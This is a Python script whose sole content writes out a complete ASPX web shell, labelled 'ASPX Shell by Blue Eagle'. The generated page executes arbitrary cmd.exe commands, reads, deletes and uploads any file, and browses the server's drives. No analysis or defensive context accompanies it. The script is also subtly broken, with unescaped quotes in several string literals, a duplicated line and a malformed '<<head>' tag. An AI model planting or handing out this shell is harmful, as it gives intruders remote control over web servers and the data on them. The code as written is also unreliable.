file = open("webshell.aspx", "w")

file.write("<%-- ASPX Shell by Blue Eagle <lt@mac.hush.com> (2007) --%>\n")
file.write('<%@ Page Language="C#" EnableViewState="false" %>\n')
file.write('<%@ Import Namespace="System.Web.UI.WebControls" %>\n')
file.write('<%@ Import Namespace="System.Diagnostics" %>\n')
file.write('<%@ Import Namespace="System.IO" %>\n')
file.write("<%\n")
file.write("	string outstr = "";\n")
file.write('	string dir = Page.MapPath(".") + "/";\n')
file.write('	if (Request.QueryString["fdir"] != null)\n')
file.write('		dir = Request.QueryString["fdir"] + "/";\n')
file.write('	dir = dir.Replace("\\", "/");\n')
file.write('	dir = dir.Replace("//", "/");\n')
file.write("	string[] dirparts = dir.Split('/');\n")
file.write("	string linkwalk = "";	\n")
file.write("	foreach (string curpart in dirparts)\n")
file.write("	{\n")
file.write("		if (curpart.Length == 0)\n")
file.write("			continue;\n")
file.write('		linkwalk += curpart + "/";\n')
file.write('		outstr += string.Format("<a href="?fdir={0}">{1}/</a>&nbsp;",\n')
file.write("									HttpUtility.UrlEncode(linkwalk),\n")
file.write("									HttpUtility.HtmlEncode(curpart));\n")
file.write("	}\n")
file.write("	lblPath.Text = outstr;\n")
file.write("	outstr = "";\n")
file.write("	foreach(DriveInfo curdrive in DriveInfo.GetDrives())\n")
file.write("{\n")
file.write("if (!curdrive.IsReady)\n")
file.write("continue;\n")
file.write('string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");\n')
file.write('outstr += string.Format("<a href="?fdir={0}">{1}</a>&nbsp;",\n')
file.write("									HttpUtility.UrlEncode(driveRoot),")
file.write("									HttpUtility.HtmlEncode(driveRoot));")
file.write("}\n")
file.write("lblDrives.Text = outstr;\n")
file.write('if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))')
file.write("{\n")
file.write("Response.ClearContent();\n")
file.write('Response.WriteFile(Request.QueryString["get"]);\n')
file.write("Response.End();\n")
file.write("}\n")
file.write('if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))\n')
file.write('File.Delete(Request.QueryString["del"]);\n')
file.write("if(flUp.HasFile)\n")
file.write("{\n")
file.write("string fileName = flUp.FileName;\n")
file.write("int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });\n")
file.write("		if (splitAt >= 0)\n")
file.write("			fileName = flUp.FileName.Substring(splitAt);\n")
file.write('		flUp.SaveAs(dir + "/" + fileName);\n')
file.write("	}\n")
file.write("	DirectoryInfo di = new DirectoryInfo(dir);\n")
file.write("	outstr = "";\n")
file.write("	foreach (DirectoryInfo curdir in di.GetDirectories())\n")
file.write("	{\n")
file.write('		string fstr = string.Format("<a href="?fdir={0}">{1}</a>",\n')
file.write('									HttpUtility.UrlEncode(dir + "/" + curdir.Name),\n')
file.write("									HttpUtility.HtmlEncode(curdir.Name));\n")
file.write("									HttpUtility.HtmlEncode(curdir.Name));\n")
file.write("	}\n")
file.write("	foreach (FileInfo curfile in di.GetFiles())\n")
file.write("	{\n")
file.write('		string fstr = string.Format("<a href="?get={0}" target="_blank">{1}</a>",\n')
file.write('									HttpUtility.UrlEncode(dir + "/" + curfile.Name),\n')
file.write("									HttpUtility.HtmlEncode(curfile.Name));\n")
file.write('		string astr = string.Format("<a href="?fdir={0}&del={1}">Del</a>",\n')
file.write("									HttpUtility.UrlEncode(dir),\n")
file.write('									HttpUtility.UrlEncode(dir + "/" + curfile.Name));\n')
file.write('		outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);\n')
file.write("	}\n")
file.write("	lblDirOut.Text = outstr;\n")
file.write("	if (txtCmdIn.Text.Length > 0)\n")
file.write("	{\n")
file.write("		Process p = new Process();\n")
file.write("		p.StartInfo.CreateNoWindow = true;\n")
file.write('		p.StartInfo.FileName = "cmd.exe";\n')
file.write('		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;\n')
file.write("		p.StartInfo.UseShellExecute = false;\n")
file.write("		p.StartInfo.RedirectStandardOutput = true;\n")
file.write("		p.StartInfo.RedirectStandardError = true;\n")
file.write("		p.StartInfo.WorkingDirectory = dir;\n")
file.write("		p.Start();\n")
file.write("		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();\n")
file.write("		txtCmdIn.Text = "";\n")
file.write("	}\n")
file.write("%>\n")
file.write('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n')
file.write('<html xmlns="http://www.w3.org/1999/xhtml" >\n')
file.write("<<head>\n")
file.write("	<title>ASPX Shell</title>\n")
file.write('	<style type="text/css">\n')
file.write("		* { font-family: Arial; font-size: 12px; }\n")
file.write("		body { margin: 0px; }\n")
file.write("		pre { font-family: Courier New; background-color: #CCCCCC; }\n")
file.write("		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }\n")
file.write("		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }\n")
file.write("		th { text-align: left; background-color: #99CC99; }\n")
file.write("		td { background-color: #CCFFCC; }\n")
file.write("		pre { margin: 2px; }\n")
file.write("	</style>\n")
file.write("</head>\n")
file.write("<body>\n")
file.write("	<h1>ASPX Shell by LT</h1>\n")
file.write('    <form id="form1" runat="server">\n')
file.write('    <table style="width: 100%; border-width: 0px; padding: 5px;">\n')
file.write("		<tr>\n")
file.write('			<td style="width: 50%; vertical-align: top;">\n')
file.write("				<h2>Shell</h2>	\n")
file.write('				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />\n')
file.write('				<asp:Button runat="server" ID="cmdExec" Text="Execute" />\n')
file.write('				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>\n')
file.write("			</td>\n")
file.write('			<td style="width: 50%; vertical-align: top;">\n')
file.write("				<h2>File Browser</h2>\n")
file.write("				<p>\n")
file.write("					Drives:<br />\n")
file.write('					<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />\n')
file.write("				</p>\n")
file.write("				<p>\n")
file.write("					Working directory:<br />\n")
file.write('					<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>\n')
file.write("				</p>\n")
file.write('				<table style="width: 100%">\n')
file.write("					<tr>\n")
file.write("						<th>Name</th>\n")
file.write("						<th>Size KB</th>\n")
file.write('						<th style="width: 50px">Actions</th>\n')
file.write("					</tr>\n")
file.write('					<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />\n')
file.write("				</table>\n")
file.write("				<p>Upload to this directory:<br />\n")
file.write('				<asp:FileUpload runat="server" ID="flUp" />\n')
file.write('				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />\n')
file.write("				</p>\n")
file.write("			</td>\n")
file.write("		</tr>\n")
file.write("    </table>\n")
file.write("    </form>\n")
file.write("</body>\n")
file.write("</html>\n")




file.close()
